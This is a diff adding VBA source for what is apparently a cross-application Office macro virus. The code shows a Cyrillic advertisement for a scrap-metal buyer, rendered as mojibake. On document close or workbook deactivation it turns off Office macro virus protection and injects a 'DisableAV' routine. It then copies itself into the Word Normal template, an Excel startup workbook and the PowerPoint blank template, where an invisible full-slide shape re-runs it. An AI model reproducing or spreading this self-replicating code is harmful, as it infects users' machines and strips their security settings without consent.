@@ -1,0 +1,180 @@
+   Attribute VB_Name = "Ïðåäëîæåíèå"
+   '<!--Ïðîãà-->
+   'Ïðåäëîæåíèå v0.01 /Ïðîãà
+   Private Sub Document_Close() ' Word
+       On Error Resume Next
+   MsgBox "ÎÎÎ ""Êóðñêìåòàëë""" & Chr(13) & "Çàêóïàåò ëîì ÷¸ðíûõ ìåòàëëîâ." & Chr(13) & "Öåíû ïðèåìëåìûå." & Chr(13) & "Íàø àäðåñ: ïð. Êóëàêîâà 109-à, òåë./ôàêñ (0712) 32-00-42": Options.VirusProtection = False
+       Options.ConfirmConversions = False
+       Options.SaveNormalPrompt = False
+       Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
+       Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
+       Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
+       If AD.Lines(1, 1) <> "'<!--Ïðîãà-->" Then
+           AD.deletelines 1, AD.CountOfLines
+           AD.InsertLines 1, TT.Lines(1, TT.CountOfLines)
+           If AD.Lines(1, 1) <> "'<!--Ïðîãà-->" Then
+               AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
+           End If
+       End If
+       If NT.Lines(1, 1) <> "'<!--Ïðîãà-->" Then
+           NT.deletelines 1, NT.CountOfLines
+           NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
+           Set xlApp = CreateObject("Excel.Application")
+           If UCase(Dir(xlApp.Application.StartupPath + "\Âòîðñûðüå.")) <> UCase("ÂÒÎÐÑÛÐÜÅ") Then
+               'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
+               'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
+               'System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
+               Set Book1Obj = xlApp.Workbooks.Add
+               Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
+               Book1Obj.SaveAs xlApp.Application.StartupPath & "\Âòîðñûðüå."
+               Book1Obj.Close
+           End If
+           xlApp.Quit
+           Set PPObj = CreateObject("PowerPoint.Application")
+           Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
+           For Each ModComponent In PBT.VBProject.VBComponents
+               If ModComponent.Name = "Ïðåäëîæåíèå" Then dontadd = True
+           Next
+           If dontadd <> True Then
+               'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
+               'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
+               'System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
+               Set NewMod = PBT.VBProject.VBComponents.Add(1)
+               NewMod.Name = "Ïðåäëîæåíèå"
+               NewMod.CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
+               NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
+               Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
+               With ShapetoWack
+                   .Name = "Ïðåäëîæåíèå"
+                   .ZOrder (1)
+                   .Line.Visible = False
+                   .Fill.Visible = False
+                   .ActionSettings(1).Action = 8
+                   .ActionSettings(1).Run = "actionhook"
+               End With
+               Set NewMod = Nothing
+               PBT.Save
+           End If
+           PBT.Close
+           PPObj.Quit
+       End If
+       If TT.Lines(1, 1) <> "'<!--Ïðîãà-->" Then
+           TT.deletelines 1, TT.CountOfLines
+           TT.InsertLines 1, NT.Lines(1, NT.CountOfLines)
+       End If
+   End Sub
+   Private Sub Workbook_Deactivate() 'Excel
+   MsgBox "ÎÎÎ ""Êóðñêìåòàëë""" & Chr(13) & "Çàêóïàåò ëîì ÷¸ðíûõ ìåòàëëîâ." & Chr(13) & "Öåíû ïðèåìëåìûå." & Chr(13) & "Íàø àäðåñ: ïð. Êóëàêîâà 109-à, òåë./ôàêñ (0712) 32-00-42":    On Error Resume Next
+       Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
+       Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
+       If UCase(Dir(Application.StartupPath + "\Âòîðñûðüå.")) <> "ÂÒÎÐÑÛÐÜÅ" Then
+           Set WordObj = GetObject(, "Word.Application")
+           If WordObj = "" Then
+               Set WordObj = CreateObject("Word.Application")
+               WQuit = True
+           End If
+           Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
+           WordObj.Options.SaveNormalPrompt = False
+           NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
+           WordObj.Run "Normal.ThisDocument.DisableAV"
+           NT.deletelines 1, NT.CountOfLines
+           NT.InsertLines 1, TW.Lines(1, TW.CountOfLines)
+           Set NT = Nothing
+           If WQuit = True Then WordObj.Quit
+           Set PPObj = CreateObject("PowerPoint.Application")
+           Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
+           For Each ModComponent In PBT.VBProject.VBComponents
+               If ModComponent.Name = "Ïðåäëîæåíèå" Then dontadd = True
+           Next
+           If dontadd <> True Then
+               Set NewMod = PBT.VBProject.VBComponents.Add(1)
+               NewMod.Name = "Ïðåäëîæåíèå"
+               NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
+               NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
+               Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
+               With ShapetoWack
+                   .Name = "Ïðåäëîæåíèå"
+                   .ZOrder (1)
+                   .Line.Visible = False
+                   .Fill.Visible = False
+                   .ActionSettings(1).Action = 8
+                   .ActionSettings(1).Run = "actionhook"
+               End With
+               Set NewMod = Nothing
+               PBT.Save
+           End If
+           PBT.Close
+           PPObj.Quit
+           Set xlApp = CreateObject("Excel.Application")
+           Set Book1Obj = xlApp.Workbooks.Add
+           Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
+           Book1Obj.SaveAs FileName:=Application.StartupPath & "\Âòîðñûðüå.", FileFormat:=xlNormal, AddToMru:=False
+           Book1Obj.Close
+           xlApp.Quit
+       End If
+       If AW.Lines(1, 1) <> "'<!--Ïðîãà-->" Then
+           AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
+       End If
+   End Sub
+   Sub actionhook(tristate)
+       On Error Resume Next
+       If Int(Rnd * 7) = 0 Then
+           MsgBox "ÎÎÎ ""Êóðñêìåòàëë""" & Chr(13) & "Çàêóïàåò ëîì ÷¸ðíûõ ìåòàëëîâ." & Chr(13) & "Öåíû ïðèåìëåìûå." & Chr(13) & "Íàø àäðåñ: ïð. Êóëàêîâà 109-à, òåë./ôàêñ (0712) 32-00-42": Set Home = ActivePresentation
+           If UCase(Dir(Application.Path + "\Xlstart\Âòîðñûðüå.")) <> UCase("ÂÒÎÐÑÛÐÜÅ") Then
+               Set WordObj = GetObject(, "Word.Application")
+               If WordObj = "" Then
+                   Set WordObj = CreateObject("Word.Application")
+                   WQuit = True
+               End If
+               Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
+               WordObj.Options.SaveNormalPrompt = False
+               NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Ïðåäëîæåíèå").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Ïðåäëîæåíèå").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
+               WordObj.Run "Normal.ThisDocument.DisableAV"
+               NT.deletelines 1, NT.CountOfLines
+               NT.InsertLines 1, Home.VBProject.VBComponents("Ïðåäëîæåíèå").CodeModule.Lines(1, Home.VBProject.VBComponents("Ïðåäëîæåíèå").CodeModule.CountOfLines)
+               NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
+               Set NT = Nothing
+               If WQuit = True Then WordObj.Quit
+               Set xlApp = CreateObject("Excel.Application")
+               Set Book1Obj = xlApp.Workbooks.Add
+               Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Ïðåäëîæåíèå").CodeModule.Lines(1, Home.VBProject.VBComponents("Ïðåäëîæåíèå").CodeModule.CountOfLines)
+               Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
+               Book1Obj.SaveAs xlApp.Application.StartupPath & "\Âòîðñûðüå."
+               Book1Obj.Close
+               xlApp.Quit
+               Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
+               dontadd = False
+               For Each ModComponent In PBT.VBProject.VBComponents
+                   If ModComponent.Name = "Ïðåäëîæåíèå" Then dontadd = True
+               Next
+               If dontadd <> True Then
+                   Set NewMod = PBT.VBProject.VBComponents.Add(1)
+                   NewMod.Name = "Ïðåäëîæåíèå"
+                   NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Ïðåäëîæåíèå").CodeModule.Lines(1, Home.VBProject.VBComponents("Ïðåäëîæåíèå").CodeModule.CountOfLines)
+                   Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
+                   With ShapetoWack
+                       .Name = "Ïðåäëîæåíèå"
+                       .ZOrder (1)
+                       .Line.Visible = False
+                       .Fill.Visible = False
+                       .ActionSettings(1).Action = 8
+                       .ActionSettings(1).Run = "actionhook"
+                   End With
+                   PBT.Save
+               End If
+               PBT.Close
+           End If
+       End If
+       ActivePresentation.SlideShowWindow.View.Next
+   End Sub
+
+
+
+
+
+
+
+
+   Option Explicit
+
+   Option Explicit
